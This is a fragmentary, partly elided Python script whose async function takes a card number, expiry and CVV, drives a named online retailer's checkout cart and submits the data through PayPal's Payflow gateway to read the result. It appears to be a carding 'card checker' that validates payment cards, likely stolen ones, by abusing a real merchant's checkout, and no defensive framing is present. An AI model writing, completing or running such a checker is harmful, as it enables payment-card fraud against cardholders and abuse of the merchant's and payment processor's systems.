...
async def Payflowavs(cc, mes, ano, cvv,):
    ...
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        try:
            ...
            async with session.get('https://inkjetsclub.com/checkout/cart/', timeout=timeout) as resp:
                ...
                try :          
                    ...
                    cartid = 'iENkUNBB9acKyzU07fVDUUEHiK90ZAP0'
            ...
            async with session.post(f'https://inkjetsclub.com/rest/default/V1/guest-carts/{cartid}/set-payment-information/', json=data, timeout=timeout) as resp:
            ...
            async with session.post('https://inkjetsclub.com/paypal/transparent/requestSecureToken/', data=data, timeout=timeout) as resp:
            ...
            async with session.post('https://payflowlink.paypal.com/', data=data, timeout=timeout) as resp:
                try :          
                    response = await resp.text()
